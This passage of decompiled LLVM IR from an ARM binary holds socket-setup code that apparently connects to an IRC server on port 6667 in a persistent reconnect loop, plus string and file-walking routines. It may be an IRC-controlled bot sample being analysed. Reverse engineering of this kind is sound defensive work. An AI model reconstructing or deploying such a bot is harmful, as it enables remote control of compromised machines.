  %v3_bac0 = load i8*, i8** %stack_var_-52, align 4
  %v4_bac0 = ptrtoint i8* %v3_bac0 to i32
  store i32 %v4_bac0, i32* @r0, align 4
  %v0_bac4 = call i32 @function_f030()
  %v9_bacc = icmp eq i32 %stack_var_-36.2, %v0_bac4
  br i1 %v9_bacc, label %dec_label_pc_bc24, label %dec_label_pc_bad4

dec_label_pc_bad4:                                ; preds = %dec_label_pc_bab0
  %v5_bab8 = inttoptr i32 %v1_bab4 to i8*
  %v1_bad8 = add nuw nsw i32 %storemerge1118, 1
  %v7_bae8 = icmp slt i32 %v1_bad8, 3
  br i1 %v7_bae8, label %dec_label_pc_ba88.preheader, label %dec_label_pc_bb04

dec_label_pc_ba88.preheader:                      ; preds = %dec_label_pc_ba54, %dec_label_pc_bad4
  %storemerge1118 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %v1_bad8, %dec_label_pc_bad4 ]
  %stack_var_-28.317 = phi i8* [ %v3_ba54, %dec_label_pc_ba54 ], [ %v5_bab8, %dec_label_pc_bad4 ]
  %stack_var_-36.316 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %stack_var_-36.2, %dec_label_pc_bad4 ]
  br label %dec_label_pc_ba88

dec_label_pc_baf8:                                ; preds = %dec_label_pc_bb1c
  %v1_bafc = add i32 %storemerge12, 1
  br label %dec_label_pc_bb04

dec_label_pc_bb04:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_baf8
  %storemerge12 = phi i32 [ %v1_bafc, %dec_label_pc_baf8 ], [ 0, %dec_label_pc_bad4 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %v1_bab4, i32* @r0, align 4
  %v0_bb0c = call i32 @function_f030()
  %v0_bb14 = load i32, i32* @r4, align 4
  %v3_bb14 = icmp ult i32 %v0_bb14, %v0_bb0c
  br i1 %v3_bb14, label %dec_label_pc_bb1c, label %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge

dec_label_pc_bb04.dec_label_pc_bb38_crit_edge:    ; preds = %dec_label_pc_bb04
  %.pre30 = add i32 %storemerge12, %v1_bab4
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_bb38

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bb04
  %v2_bb28 = add i32 %storemerge12, %v1_bab4
  %v1_bb2c = inttoptr i32 %v2_bb28 to i8*
  %v2_bb2c = load i8, i8* %v1_bb2c, align 1
  %v7_bb30 = icmp eq i8 %v2_bb2c, 32
  br i1 %v7_bb30, label %dec_label_pc_bb38, label %dec_label_pc_baf8

dec_label_pc_bb38:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge
  %v3_bb4c.pre-phi = phi i8* [ %.pre31, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge ], [ %v1_bb2c, %dec_label_pc_bb1c ]
  store i8 0, i8* %v3_bb4c.pre-phi, align 1
  store i32 %v1_bab4, i32* @r0, align 4
  %v2_bb54 = call i32 @function_f730(i32 %v1_bab4)
  %v5_bb5c = trunc i32 %v2_bb54 to i8
  store i8 %v5_bb5c, i8* %stack_var_-40, align 1
  %v3_bb64 = icmp eq i8 %v5_bb5c, -1
  br i1 %v3_bb64, label %dec_label_pc_bb6c, label %dec_label_pc_bbc8

dec_label_pc_bb6c:                                ; preds = %dec_label_pc_bb38
  %v2_bb70 = call i32 @function_f754(i32 %v1_bab4)
  %v2_bb80 = icmp eq i32 %v2_bb70, 0
  br i1 %v2_bb80, label %dec_label_pc_bb88, label %dec_label_pc_bba4

dec_label_pc_bb88:                                ; preds = %dec_label_pc_bb6c
  %v2_bb8c = load i32, i32* @global_var_22ed0.185, align 4
  store i32 %v2_bb8c, i32* @r2, align 4
  %v3_bb9c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_16a60.222 to i32))
  br label %dec_label_pc_bc24

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb6c
  %v2_bba4 = ptrtoint i8* %stack_var_-40 to i32
  %v1_bbac = add i32 %v2_bb70, 16
  %v2_bbac = inttoptr i32 %v1_bbac to i32*
  %v3_bbac = load i32, i32* %v2_bbac, align 4
  %v1_bbb0 = inttoptr i32 %v3_bbac to i32*
  %v2_bbb0 = load i32, i32* %v1_bbb0, align 4
  store i32 %v2_bbb0, i32* @r1, align 4
  %v1_bbb8 = add i32 %v2_bb70, 12
  %v2_bbb8 = inttoptr i32 %v1_bbb8 to i32*
  %v3_bbb8 = load i32, i32* %v2_bbb8, align 4
  store i32 %v2_bba4, i32* @r0, align 4
  store i32 %v3_bbb8, i32* @r2, align 4
  %v0_bbc4 = call i32 @function_ef60()
  %v2_bbd4.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_bbc8

dec_label_pc_bbc8:                                ; preds = %dec_label_pc_bb38, %dec_label_pc_bba4
  %v12_bc2826 = phi i32 [ %v0_bbc4, %dec_label_pc_bba4 ], [ %v2_bb54, %dec_label_pc_bb38 ]
  %v2_bbd4 = phi i8 [ %v2_bbd4.pre, %dec_label_pc_bba4 ], [ %v5_bb5c, %dec_label_pc_bb38 ]
  store i8 %v2_bbd4, i8* bitcast (i8** @global_var_20643.224 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_20640.33 to i8*), align 4
  store i32 256, i32* @global_var_20644.35, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bc24:                                ; preds = %dec_label_pc_b984, %dec_label_pc_bab0, %dec_label_pc_ba44, %dec_label_pc_ba0c, %dec_label_pc_bb88, %dec_label_pc_bbc8
  %v12_bc28 = phi i32 [ 0, %dec_label_pc_ba44 ], [ %v4_ba34, %dec_label_pc_ba0c ], [ %v3_bb9c, %dec_label_pc_bb88 ], [ %v12_bc2826, %dec_label_pc_bbc8 ], [ %v0_bac4, %dec_label_pc_bab0 ], [ %v0_b998, %dec_label_pc_b984 ]
  ret i32 %v12_bc28

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v1_bad8, { 1, 0 }
  uselistorder i32 %v1_bab4, { 2, 4, 3, 0, 1, 5, 6 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_b9ac, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_20640.33, { 0, 1, 4, 3, 2 }
  uselistorder i32* @global_var_20644.35, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_bc24, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bbc8, { 1, 0 }
  uselistorder label %dec_label_pc_bb04, { 1, 0 }
  uselistorder label %dec_label_pc_ba88.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_bab0, { 1, 0 }
  uselistorder label %dec_label_pc_b9d8, { 1, 0 }
  uselistorder label %dec_label_pc_b95c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b984, { 1, 0 }
}

define i32 @function_bc40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bc40:
  %stack_var_-4 = alloca i32, align 4
  store i32 48204, i32* %stack_var_-4, align 4
  %v2_bc48 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bc48, i32* @fp, align 4
  %v2_bc60 = load i32, i32* @global_var_22dbc.187, align 4
  store i32 %v2_bc60, i32* @r0, align 4
  %v0_bc68 = call i32 @function_fdcc()
  %v0_bc6c = call i32 @function_8688()
  store i32 %v0_bc6c, i32* @global_var_22dbc.187, align 4
  ret i32 %v0_bc6c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_bc88(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_bc88:
  %stack_var_-36 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bcbc

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bcd4
  %v1_bcb4 = add i32 %storemerge2, 1
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bcb0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_bc88 ], [ %v1_bcb4, %dec_label_pc_bcb0 ]
  store i32 %storemerge2, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_bcc4 = call i32 @function_f030()
  %v0_bccc = load i32, i32* @r4, align 4
  %v3_bccc = icmp ult i32 %v0_bccc, %v0_bcc4
  br i1 %v3_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge

dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge:    ; preds = %dec_label_pc_bcbc
  %.pre = add i32 %storemerge2, %arg2
  %.pre6 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_bcf0

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bcbc
  %v2_bce0 = add i32 %storemerge2, %arg2
  %v1_bce4 = inttoptr i32 %v2_bce0 to i8*
  %v2_bce4 = load i8, i8* %v1_bce4, align 1
  %v7_bce8 = icmp eq i8 %v2_bce4, 33
  br i1 %v7_bce8, label %dec_label_pc_bcf0, label %dec_label_pc_bcb0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge
  %v3_bd04.pre-phi = phi i8* [ %.pre6, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge ], [ %v1_bce4, %dec_label_pc_bcd4 ]
  store i8 0, i8* %v3_bd04.pre-phi, align 1
  %v2_bd0c = load i32, i32* @global_var_22dbc.187, align 4
  %v2_bd18 = inttoptr i32 %arg2 to i8*
  %v3_bd18 = call i32 @function_f464(i8* %v2_bd18, i32 %v2_bd0c)
  %v2_bd20 = icmp eq i32 %v3_bd18, 0
  br i1 %v2_bd20, label %dec_label_pc_bd28, label %dec_label_pc_bd7c

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bcf0
  %v3_bd28 = load i8*, i8** %stack_var_-36, align 4
  %v2_bd2c = load i8, i8* %v3_bd28, align 1
  %v7_bd30 = icmp eq i8 %v2_bd2c, 58
  br i1 %v7_bd30, label %dec_label_pc_bd38, label %dec_label_pc_bd44

dec_label_pc_bd38:                                ; preds = %dec_label_pc_bd28
  %v4_bd28 = ptrtoint i8* %v3_bd28 to i32
  %v1_bd3c = add i32 %v4_bd28, 1
  %v5_bd40 = inttoptr i32 %v1_bd3c to i8*
  store i8* %v5_bd40, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd28, %dec_label_pc_bd38
  %v3_bd644 = phi i8* [ %v3_bd28, %dec_label_pc_bd28 ], [ %v5_bd40, %dec_label_pc_bd38 ]
  %v2_bd48 = load i32, i32* @global_var_22dbc.187, align 4
  %v2_bd4c = icmp eq i32 %v2_bd48, 0
  br i1 %v2_bd4c, label %dec_label_pc_bd64, label %dec_label_pc_bd54

dec_label_pc_bd54:                                ; preds = %dec_label_pc_bd44
  store i32 %v2_bd48, i32* @r0, align 4
  %v0_bd60 = call i32 @function_fdcc()
  %v3_bd64.pre = load i8*, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd64

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bd54
  %v3_bd64 = phi i8* [ %v3_bd644, %dec_label_pc_bd44 ], [ %v3_bd64.pre, %dec_label_pc_bd54 ]
  %v4_bd64 = ptrtoint i8* %v3_bd64 to i32
  %v2_bd68 = call i32 @function_f4e0(i32 %v4_bd64)
  store i32 %v2_bd68, i32* @global_var_22dbc.187, align 4
  br label %dec_label_pc_bd7c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bd64
  %v12_bd80 = phi i32 [ %v3_bd18, %dec_label_pc_bcf0 ], [ %v2_bd68, %dec_label_pc_bd64 ]
  ret i32 %v12_bd80

; uselistorder directives
  uselistorder i8* %v3_bd28, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-36, { 0, 3, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_bd7c, { 1, 0 }
  uselistorder label %dec_label_pc_bd64, { 1, 0 }
  uselistorder label %dec_label_pc_bd44, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
}

define i32 @function_bd88() local_unnamed_addr {
dec_label_pc_bd88:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_bd8c = load i32, i32* @fp, align 4
  store i32 48532, i32* %stack_var_-4, align 4
  %v2_bd90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd90, i32* @fp, align 4
  %v2_beb8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_bf24 = ptrtoint i32* %stack_var_-48 to i32
  %v3_bf74 = bitcast i32* %stack_var_-44 to %sockaddr*
  br label %dec_label_pc_bd9c

dec_label_pc_bd9c:                                ; preds = %dec_label_pc_bd9c.backedge, %dec_label_pc_bd88
  store i32 -1, i32* @global_var_22dc0.25, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_bdb4 = load i32, i32* @global_var_20638.144, align 4
  %v2_bdb8 = icmp eq i32 %v2_bdb4, 0
  br i1 %v2_bdb8, label %dec_label_pc_bdc0, label %dec_label_pc_bdf4

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd9c
  %v0_bdc0 = call i32 @function_10364()
  %v2_bdcc = load i32, i32* @global_var_201ec.232, align 4
  %v2_bdd8 = call i32 @function_cafc(i32 %v0_bdc0, i32 %v2_bdcc)
  %v4_bde8 = mul i32 %v2_bdd8, 4
  %v5_bde8 = add i32 %v4_bde8, ptrtoint ([16 x i8]** @global_var_201f0.235 to i32)
  %v6_bde8 = inttoptr i32 %v5_bde8 to i32*
  %v7_bde8 = load i32, i32* %v6_bde8, align 4
  store i32 %v7_bde8, i32* @global_var_22ec8.142, align 4
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bd9c, %dec_label_pc_bdc0
  store i32 0, i32* @global_var_20638.144, align 4
  br label %dec_label_pc_be00

dec_label_pc_be00:                                ; preds = %dec_label_pc_be00, %dec_label_pc_bdf4
  %v3_be0c = call i32 @function_fc4c(i32 2, i32 1, i32 6)
  store i32 %v3_be0c, i32* @global_var_22dc0.25, align 4
  %v1_be24 = icmp slt i32 %v3_be0c, 0
  br i1 %v1_be24, label %dec_label_pc_be00, label %dec_label_pc_be2c

dec_label_pc_be2c:                                ; preds = %dec_label_pc_be00
  %v2_be30 = load i32, i32* @global_var_22ec8.142, align 4
  store i32 %v2_be30, i32* @r0, align 4
  %v1_be38 = call i32 @function_f730(i32 %v2_be30)
  %v2_be40 = icmp eq i32 %v1_be38, 0
  br i1 %v2_be40, label %dec_label_pc_be64, label %dec_label_pc_be48

dec_label_pc_be48:                                ; preds = %dec_label_pc_be2c
  %v2_be4c = load i32, i32* @global_var_22ec8.142, align 4
  store i32 %v2_be4c, i32* @r0, align 4
  %v1_be54 = call i32 @function_f730(i32 %v2_be4c)
  %v3_be5c = icmp eq i32 %v1_be54, -1
  br i1 %v3_be5c, label %dec_label_pc_be64, label %dec_label_pc_bed8

dec_label_pc_be64:                                ; preds = %dec_label_pc_be48, %dec_label_pc_be2c
  %v2_be68 = load i32, i32* @global_var_22ec8.142, align 4
  %v1_be70 = call i32 @function_f754(i32 %v2_be68)
  %v2_be80 = icmp eq i32 %v1_be70, 0
  br i1 %v2_be80, label %dec_label_pc_be88, label %dec_label_pc_bea8

dec_label_pc_be88:                                ; preds = %dec_label_pc_be64
  store i32 0, i32* @global_var_22ec8.142, align 4
  %v2_be98 = load i32, i32* @global_var_22dc0.25, align 4
  %v1_bea0 = call i32 @function_cbe4(i32 %v2_be98)
  br label %dec_label_pc_bd9c.backedge

dec_label_pc_bd9c.backedge:                       ; preds = %dec_label_pc_be88, %dec_label_pc_c058
  br label %dec_label_pc_bd9c

dec_label_pc_bea8:                                ; preds = %dec_label_pc_be64
  %v1_beac = add i32 %v1_be70, 16
  %v2_beac = inttoptr i32 %v1_beac to i32*
  %v3_beac = load i32, i32* %v2_beac, align 4
  %v1_beb0 = inttoptr i32 %v3_beac to i32*
  %v2_beb0 = load i32, i32* %v1_beb0, align 4
  %v1_bec0 = add i32 %v1_be70, 12
  %v2_bec0 = inttoptr i32 %v1_bec0 to i32*
  %v3_bec0 = load i32, i32* %v2_bec0, align 4
  store i32 %v3_bec0, i32* @r2, align 4
  %v3_bed0 = call i32 @function_ef50(i32 %v2_beb0, i32 %v2_beb8, i32 %v3_bec0)
  br label %dec_label_pc_bef0

dec_label_pc_bed8:                                ; preds = %dec_label_pc_be48
  %v2_bedc = load i32, i32* @global_var_22ec8.142, align 4
  store i32 %v2_bedc, i32* @r0, align 4
  %v1_bee4 = call i32 @function_f730(i32 %v2_bedc)
  store i32 %v1_bee4, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bef0

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bea8, %dec_label_pc_bed8
  store i32 2, i32* %stack_var_-44, align 4
  %v1_bf08 = call i32 @function_f604(i32 6667)
  %v2_bf20 = load i32, i32* @global_var_22dc0.25, align 4
  store i32 %v2_bf20, i32* @r3, align 4
  %v3_bf34 = call i32 @function_cd84(i32 %v2_bf20, i32 21537, i32 %v2_bf24)
  %v2_bf3c = call i32 @function_ce30(i32* null)
  br label %dec_label_pc_c038

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_c038
  %v0_bf4c = call i32 @function_cec4()
  %v2_bf58 = inttoptr i32 %v0_bf4c to i32*
  store i32 0, i32* %v2_bf58, align 4
  %v2_bf60 = load i32, i32* @global_var_22dc0.25, align 4
  %v4_bf74 = call i32 @function_fb64(i32 %v2_bf60, %sockaddr* %v3_bf74, i32 16)
  %v2_bf7c = icmp eq i32 %v4_bf74, 0
  br i1 %v2_bf7c, label %dec_label_pc_bf98, label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf4c
  %v0_bf84 = call i32 @function_cec4()
  %v1_bf8c = inttoptr i32 %v0_bf84 to i32*
  %v2_bf8c = load i32, i32* %v1_bf8c, align 4
  %v7_bf90 = icmp eq i32 %v2_bf8c, 106
  br i1 %v7_bf90, label %dec_label_pc_bf98, label %dec_label_pc_c008

dec_label_pc_bf98:                                ; preds = %dec_label_pc_bf84, %dec_label_pc_bf4c
  %v2_bf9c = load i32, i32* @global_var_22dc0.25, align 4
  %v6_bfb8 = call i32 @function_fc1c(i32 %v2_bf9c, i32 1, i32 13, i32* null, i32 0)
  %v2_bfc0 = load i32, i32* @global_var_22dc0.25, align 4
  %v6_bfdc = call i32 @function_fc1c(i32 %v2_bfc0, i32 1, i32 2, i32* null, i32 0)
  %v2_bfe4 = load i32, i32* @global_var_22dc0.25, align 4
  %v6_c000 = call i32 @function_fc1c(i32 %v2_bfe4, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_bd8c, i32* @fp, align 4
  ret i32 %v6_c000

dec_label_pc_c008:                                ; preds = %dec_label_pc_bf84
  %v0_c008 = call i32 @function_cec4()
  %v1_c010 = inttoptr i32 %v0_c008 to i32*
  %v2_c010 = load i32, i32* %v1_c010, align 4
  %v7_c014 = icmp eq i32 %v2_c010, 115
  br i1 %v7_c014, label %dec_label_pc_c030, label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_c008
  %v0_c01c = call i32 @function_cec4()
  %v1_c024 = inttoptr i32 %v0_c01c to i32*
  %v2_c024 = load i32, i32* %v1_c024, align 4
  %v7_c028 = icmp eq i32 %v2_c024, 114
  br i1 %v7_c028, label %dec_label_pc_c030, label %dec_label_pc_c058

dec_label_pc_c030:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c008
  %v1_c034 = call i32 @function_10b3c(i32 1)
  br label %dec_label_pc_c038

dec_label_pc_c038:                                ; preds = %dec_label_pc_bef0, %dec_label_pc_c030
  %v2_c03c = call i32 @function_ce30(i32* null)
  %v2_c04c = sub i32 %v2_c03c, %v2_bf3c
  %tmp = icmp ult i32 %v2_c04c, 10
  br i1 %tmp, label %dec_label_pc_bf4c, label %dec_label_pc_c058

dec_label_pc_c058:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c038
  store i32 0, i32* @global_var_22ec8.142, align 4
  %v2_c068 = load i32, i32* @global_var_22dc0.25, align 4
  %v1_c070 = call i32 @function_cbe4(i32 %v2_c068)
  br label %dec_label_pc_bd9c.backedge

; uselistorder directives
  uselistorder i32 %v3_bec0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32)* @function_f604, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ef50, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_f754, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10364, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c058, { 1, 0 }
  uselistorder label %dec_label_pc_c038, { 1, 0 }
  uselistorder label %dec_label_pc_bef0, { 1, 0 }
  uselistorder label %dec_label_pc_bd9c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
}

define i32 @function_c094(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_c094:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-2644 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-1620 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-6740 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c098 = load i32, i32* @r4, align 4
  store i32 %v3_c098, i32* %stack_var_-20, align 4
  store i32 49312, i32* %stack_var_-4, align 4
  %v16_c098 = ptrtoint i32* %stack_var_-20 to i32
  %v2_c09c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c09c, i32* @fp, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_16ae0.238 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15ca8.39 to i32), i32* @r1, align 4
  %v3_c0d8 = call i32 @function_d050(i32 ptrtoint ([19 x i8]* @global_var_16ae0.238 to i32), i32 ptrtoint (i32* @global_var_15ca8.39 to i32))
  %v2_c0e8 = icmp eq i32 %v3_c0d8, 0
  br i1 %v2_c0e8, label %dec_label_pc_c0f0, label %dec_label_pc_c10c

dec_label_pc_c0f0:                                ; preds = %dec_label_pc_c094
  store i32 ptrtoint ([13 x i8]* @global_var_16af4.241 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15ca8.39 to i32), i32* @r1, align 4
  %v3_c100 = call i32 @function_d050(i32 ptrtoint ([13 x i8]* @global_var_16af4.241 to i32), i32 ptrtoint (i32* @global_var_15ca8.39 to i32))
  br label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c094, %dec_label_pc_c0f0
  %stack_var_-64.0 = phi i32 [ %v3_c100, %dec_label_pc_c0f0 ], [ %v3_c0d8, %dec_label_pc_c094 ]
  %stack_var_-68.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_16af4.241, i32 0, i32 0), %dec_label_pc_c0f0 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_16ae0.238, i32 0, i32 0), %dec_label_pc_c094 ]
  %v2_c110 = icmp eq i32 %stack_var_-64.0, 0
  br i1 %v2_c110, label %dec_label_pc_c298, label %dec_label_pc_c118

dec_label_pc_c118:                                ; preds = %dec_label_pc_c10c
  %v2_c128 = load i32, i32* %arg2, align 4
  store i32 %v2_c128, i32* @r0, align 4
  %v0_c130 = call i32 @function_f030()
  %v2_c144 = ptrtoint i32* %stack_var_-332 to i32
  %v2_c150 = bitcast i32* %stack_var_-332 to i8*
  %v3_c150 = call i32 @function_cc3c(i8* %v2_c150, i32 256)
  store i32 ptrtoint (i32* @global_var_16b04.243 to i32), i32* @r1, align 4
  %v3_c160 = call i32 @function_f010(i8* %v2_c150, i32 ptrtoint (i32* @global_var_16b04.243 to i32))
  %v2_c168 = icmp eq i32 %v3_c160, 0
  br i1 %v2_c168, label %dec_label_pc_c290, label %dec_label_pc_c180

dec_label_pc_c174:                                ; preds = %dec_label_pc_c180
  %v1_c178 = add i32 %stack_var_-60.0, -1
  br label %dec_label_pc_c180

dec_label_pc_c180:                                ; preds = %dec_label_pc_c118, %dec_label_pc_c174
  %stack_var_-60.0 = phi i32 [ %v1_c178, %dec_label_pc_c174 ], [ %v0_c130, %dec_label_pc_c118 ]
  %v2_c190 = load i32, i32* %arg2, align 4
  %v2_c198 = add i32 %v2_c190, %stack_var_-60.0
  %v1_c19c = inttoptr i32 %v2_c198 to i8*
  %v2_c19c = load i8, i8* %v1_c19c, align 1
  %v7_c1a0 = icmp eq i8 %v2_c19c, 47
  br i1 %v7_c1a0, label %dec_label_pc_c1a8, label %dec_label_pc_c174

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c180
  %v2_c1c4 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v2_c1c4, i32* @r0, align 4
  %v4_c1d8 = call i32 @function_d06c(i32 %v2_c1c4, i32 ptrtoint ([8 x i8]* @global_var_16b08.245 to i32), i32 %v2_c144)
  %v1_c224 = inttoptr i32 %stack_var_-64.0 to i8*
  %v2_c1e0 = ptrtoint i32* %stack_var_-1620 to i32
  %v2_c204 = bitcast i32* %stack_var_-1620 to i8*
  br label %dec_label_pc_c220.outer

dec_label_pc_c1e0:                                ; preds = %dec_label_pc_c220
  %v3_c1f0 = call i32 @function_e7bc(i32 %v2_c1e0, i32 1024, i32 %stack_var_-64.0)
  %v3_c204 = call i32 @function_f464(i8* %v2_c204, i32 %v2_c1c4)
  %v2_c20c = icmp eq i32 %v3_c204, 0
  br i1 %v2_c20c, label %dec_label_pc_c214, label %dec_label_pc_c220

dec_label_pc_c214:                                ; preds = %dec_label_pc_c1e0
  %v1_c218 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_c220.outer

dec_label_pc_c220.outer:                          ; preds = %dec_label_pc_c214, %dec_label_pc_c1a8
  %stack_var_-56.0.ph = phi i32 [ %v1_c218, %dec_label_pc_c214 ], [ 0, %dec_label_pc_c1a8 ]
  br label %dec_label_pc_c220

dec_label_pc_c220:                                ; preds = %dec_label_pc_c220.outer, %dec_label_pc_c1e0
  %v2_c224 = call i32 @function_e738(i8* %v1_c224)
  %v2_c22c = icmp eq i32 %v2_c224, 0
  br i1 %v2_c22c, label %dec_label_pc_c1e0, label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %dec_label_pc_c220
  %v2_c238 = icmp eq i32 %stack_var_-56.0.ph, 0
  %v2_c244 = call i32 @function_ced0(i8* %v1_c224)
  br i1 %v2_c238, label %dec_label_pc_c240, label %dec_label_pc_c298

dec_label_pc_c240:                                ; preds = %dec_label_pc_c234
  %v4_c248 = ptrtoint i8* %stack_var_-68.0 to i32
  store i32 %v4_c248, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16b10.247 to i32), i32* @r1, align 4
  %v3_c250 = call i32 @function_d050(i32 %v4_c248, i32 ptrtoint (i32* @global_var_16b10.247 to i32))
  %v2_c260 = icmp eq i32 %v3_c250, 0
  br i1 %v2_c260, label %dec_label_pc_c298, label %dec_label_pc_c268

dec_label_pc_c268:                                ; preds = %dec_label_pc_c240
  %v2_c274 = call i32 @function_e91c(i32 %v2_c1c4, i32 %v3_c250)
  %v1_c27c = inttoptr i32 %v3_c250 to i8*
  %v2_c27c = call i32 @function_ced0(i8* %v1_c27c)
  br label %dec_label_pc_c298

dec_label_pc_c290:                                ; preds = %dec_label_pc_c118
  %v1_c294 = inttoptr i32 %stack_var_-64.0 to i8*
  %v2_c294 = call i32 @function_ced0(i8* %v1_c294)
  br label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c240, %dec_label_pc_c10c, %dec_label_pc_c268, %dec_label_pc_c290
  %v0_c298 = call i32 @function_cc10()
  %v2_c2a0 = icmp eq i32 %v0_c298, 0
  br i1 %v2_c2a0, label %dec_label_pc_c2b0, label %dec_label_pc_c2a8

dec_label_pc_c2a8:                                ; preds = %dec_label_pc_c298
  %v1_c2ac = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_c2b0

dec_label_pc_c2b0:                                ; preds = %dec_label_pc_c298, %dec_label_pc_c2a8
  %v2_c2c0 = load i32, i32* %arg2, align 4
  store i32 %v2_c2c0, i32* @r4, align 4
  %v2_c2d4 = load i32, i32* %arg2, align 4
  store i32 %v2_c2d4, i32* @r0, align 4
  %v0_c2dc = call i32 @function_f030()
  %v0_c2e4 = load i32, i32* @r4, align 4
